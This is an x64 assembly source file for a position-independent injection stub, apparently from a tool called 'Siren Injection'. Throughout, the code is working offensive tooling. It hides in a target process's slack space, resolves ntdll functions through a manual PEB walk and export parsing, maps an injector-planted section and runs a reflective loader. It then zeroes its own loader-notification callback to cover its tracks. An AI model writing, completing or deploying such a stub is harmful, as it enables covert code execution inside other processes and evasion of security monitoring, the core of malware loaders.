/* src/stub/siren_stub_x64_gas.S
 *
 * Siren Injection — PIC notification stub (AT&T / GAS syntax for MinGW)
 *
 * Calling convention: Windows x64
 *   %rcx = ULONG  NotificationReason
 *   %rdx = PVOID  NotificationData
 *   %r8  = PVOID  Context  ← HANDLE of the PE section (planted by injector)
 *
 * Blob layout in the target's slack space:
 *   [siren_stub_code ...]      ← this code (PIC, RIP-relative strings)
 *   [stub_entry_offset_slot]   ← QWORD: offset to the notify entry
 *   [str_* literals]
 *   [siren_stub_handle_slot]   ← QWORD: HANDLE value (patched by injector)
 *   ... (padding) ...
 *   [siren_ldr_notify_entry]   ← the LIST_ENTRY + Callback + Context
 */

    .intel_syntax noprefix
    .text

/* ── String helpers (RIP-relative) ─────────────────────────────────── */
.section .rdata,"dr"
str_ntdll:    .asciz "ntdll.dll"
str_ntmvos:   .asciz "NtMapViewOfSection"
str_ntumvos:  .asciz "NtUnmapViewOfSection"
str_ntclose:  .asciz "NtClose"
.text

/* ── sr_find_module: PEB walk to find a module base by ASCII name ─── */
/* Input:  rcx = ASCII DLL name (lowercase, NUL-terminated)            */
/* Output: rax = module base or 0                                       */
    .global sr_find_module_pic
sr_find_module_pic:
    /* TEB.ProcessEnvironmentBlock at GS:[0x60] */
    mov rax, gs:[0x60]          /* RAX = PEB */
    mov rax, [rax + 0x18]       /* RAX = PEB.Ldr */
    lea r10, [rax + 0x20]       /* R10 = &InMemoryOrderModuleList head */
    mov r11, [r10]              /* R11 = head->Flink */
.Lfind_loop:
    cmp r11, r10
    je  .Lfind_notfound
    /* DllBase at InMemory+0x20 */
    mov r9, [r11 + 0x20]
    test r9, r9
    jz  .Lfind_next
    cmp r9, 0x10000
    jb  .Lfind_next
    /* BaseDllName.Length at +0x38, .Buffer at +0x40 */
    movzx edx, word ptr [r11 + 0x38]
    shr  edx, 1                 /* chars */
    mov  r8,  [r11 + 0x40]     /* Buffer */
    push rcx
    push r11
    xor  eax, eax
.Lcmp_loop:
    test edx, edx
    jz  .Lcmp_check_end
    movzx eax, byte ptr [rcx]
    test al, al
    jz  .Lcmp_mismatch
    cmp  al, 'A'
    jb  .Lcmp_skip_lo
    cmp  al, 'Z'
    ja  .Lcmp_skip_lo
    or   al, 0x20
.Lcmp_skip_lo:
    movzx r11d, word ptr [r8]
    cmp  r11d, 'A'
    jb  .Lcmp_skip_lo2
    cmp  r11d, 'Z'
    ja  .Lcmp_skip_lo2
    or   r11d, 0x20
.Lcmp_skip_lo2:
    cmp  eax, r11d
    jne .Lcmp_mismatch
    inc  rcx
    add  r8, 2
    dec  edx
    jmp .Lcmp_loop
.Lcmp_check_end:
    movzx eax, byte ptr [rcx]
    test al, al
    jnz .Lcmp_mismatch
    pop  r11
    pop  rcx
    mov  rax, r9
    ret
.Lcmp_mismatch:
    pop  r11
    pop  rcx
.Lfind_next:
    mov  r11, [r11]
    jmp .Lfind_loop
.Lfind_notfound:
    xor  eax, eax
    ret

/* ── sr_find_export_pic: find named export in a module ────────────── */
/* Input:  rcx = mod base, rdx = ASCII func name                        */
/* Output: rax = func address or 0                                      */
    .global sr_find_export_pic
sr_find_export_pic:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    mov  r12, rcx               /* mod base */
    mov  r13, rdx               /* func name */

    /* e_lfanew */
    mov  eax, dword ptr [r12 + 0x3C]
    add  rax, r12               /* NT headers */

    /* DataDirectory[0] = export dir, at OptHdr+0x70, OptHdr at NT+0x18 */
    mov  esi, dword ptr [rax + 0x18 + 0x70]   /* ExportDir RVA */
    test esi, esi
    jz  .Lexp_notfound
    mov  ebx, dword ptr [rax + 0x18 + 0x74]   /* ExportDir Size */

    lea  r14, [r12 + rsi]       /* ExportDir* */

    mov  r15d, dword ptr [r14 + 0x18]  /* NumberOfNames */
    test r15d, r15d
    jz  .Lexp_notfound

    mov  ecx, dword ptr [r14 + 0x20]   /* AddressOfNames RVA */
    lea  rdi, [r12 + rcx]

    xor  r9d, r9d
.Lexp_loop:
    cmp  r9d, r15d
    jae .Lexp_notfound

    mov  ecx, dword ptr [rdi + r9*4]
    lea  rcx, [r12 + rcx]       /* name ptr */

    push rdi
    push r9
    mov  rsi, r13
.Lstr_cmp:
    mov  al,  byte ptr [rcx]
    mov  dl,  byte ptr [rsi]
    cmp  al, dl
    jne .Lstr_miss
    test al, al
    jz  .Lstr_hit
    inc  rcx; inc rsi
    jmp .Lstr_cmp
.Lstr_miss:
    pop  r9; pop rdi
    inc  r9d
    jmp .Lexp_loop
.Lstr_hit:
    pop  r9; pop rdi

    /* ordinals array */
    mov  ecx, dword ptr [r14 + 0x24]
    lea  rcx, [r12 + rcx]
    movzx ecx, word ptr [rcx + r9*2]

    /* func RVA */
    mov  edx, dword ptr [r14 + 0x1C]
    lea  rdx, [r12 + rdx]
    mov  eax, dword ptr [rdx + rcx*4]

    /* forwarder check */
    cmp  eax, esi
    jb  .Lexp_ok
    lea  ecx, [esi + ebx]
    cmp  eax, ecx
    jae .Lexp_ok
    xor  eax, eax
    jmp .Lexp_done
.Lexp_ok:
    add  rax, r12
    jmp .Lexp_done
.Lexp_notfound:
    xor  eax, eax
.Lexp_done:
    pop  r15; pop r14; pop r13; pop r12
    pop  rdi; pop rsi; pop rbx
    ret

/* ── Main notification callback ────────────────────────────────────── */
    .global siren_stub_code
    .global siren_stub_code_size
    .global siren_stub_handle_patch_offset

    .align 16
siren_stub_code:
SirenNotifyStub:
    push rbp
    mov  rbp, rsp
    sub  rsp, 0xC0
    and  rsp, -16
    push rbx; push rsi; push rdi
    push r12; push r13; push r14; push r15

    mov  r12, rcx   /* NotificationReason */
    mov  r13, rdx   /* NotificationData   */
    mov  r14, r8    /* Context = HANDLE   */

    /* 1. Find ntdll */
    lea  rcx, [rip + str_ntdll]
    call sr_find_module_pic
    test rax, rax
    jz  .Lstub_done
    mov  r15, rax   /* ntdll base */

    /* 2. NtMapViewOfSection */
    mov  rcx, r15
    lea  rdx, [rip + str_ntmvos]
    call sr_find_export_pic
    test rax, rax
    jz  .Lstub_done
    mov  rbx, rax   /* NtMapViewOfSection */

    /* 3. Map the section (RW) */
    xor  eax, eax
    mov  qword ptr [rbp - 0x10], rax  /* Base = NULL */
    mov  qword ptr [rbp - 0x18], rax  /* ViewSize = 0 */

    mov  rcx, r14                     /* hSection */
    mov  rdx, -1                      /* hProcess */
    lea  r8,  [rbp - 0x10]            /* &Base */
    xor  r9,  r9                      /* ZeroBits */
    /* stack args (shadow + extras) */
    sub  rsp, 0x48
    xor  eax, eax
    mov  qword ptr [rsp + 0x20], rax  /* CommitSize */
    mov  qword ptr [rsp + 0x28], rax  /* SectionOffset */
    lea  rax, [rbp - 0x18]
    mov  qword ptr [rsp + 0x30], rax  /* &ViewSize */
    mov  qword ptr [rsp + 0x38], 2    /* ViewUnmap */
    xor  eax, eax
    mov  qword ptr [rsp + 0x40], rax  /* AllocationType */
    mov  qword ptr [rsp + 0x48], 4    /* PAGE_READWRITE */
    call rbx
    add  rsp, 0x48

    test eax, eax
    js  .Lstub_cleanup

    mov  rsi, qword ptr [rbp - 0x10]  /* mapped base */
    test rsi, rsi
    jz  .Lstub_cleanup

    /* 4. Call reflective loader */
    mov  rcx, rsi
    mov  rdx, 0x40000000  /* conservative view_size */
    call sr_refl_load     /* defined in refl_loader.c */

    /* 5. Unmap our RW view */
.Lstub_cleanup:
    mov  rcx, r15
    lea  rdx, [rip + str_ntumvos]
    call sr_find_export_pic
    test rax, rax
    jz  .Lstub_close
    mov  rcx, -1
    mov  rdx, rsi
    call rax              /* NtUnmapViewOfSection */

.Lstub_close:
    /* 6. NtClose the section handle */
    mov  rcx, r15
    lea  rdx, [rip + str_ntclose]
    call sr_find_export_pic
    test rax, rax
    jz  .Lstub_nop
    mov  rcx, r14
    call rax              /* NtClose */

.Lstub_nop:
    /* 7. NOP-self: zero entry->Callback (LIST_ENTRY = 16 bytes, so +16) */
    lea  rax, [rip + stub_entry_offset_slot]
    mov  rax, qword ptr [rax]
    lea  rcx, [rip + siren_stub_code]
    add  rcx, rax
    xor  eax, eax
    mov  qword ptr [rcx + 0x10], rax

.Lstub_done:
    pop  r15; pop r14; pop r13; pop r12
    pop  rdi; pop rsi; pop rbx
    mov  rsp, rbp
    pop  rbp
    ret

/* Slots patched by siren_stub.c */
    .align 8
stub_entry_offset_slot:
    .quad 0

    .align 8
siren_stub_handle_slot:
    .quad 0xDEADBEEFCAFEBABE  /* patched to real HANDLE */

siren_stub_code_end:

    .align 8
siren_stub_code_size:
    .quad siren_stub_code_end - siren_stub_code

siren_stub_handle_patch_offset:
    .quad siren_stub_handle_slot - siren_stub_code
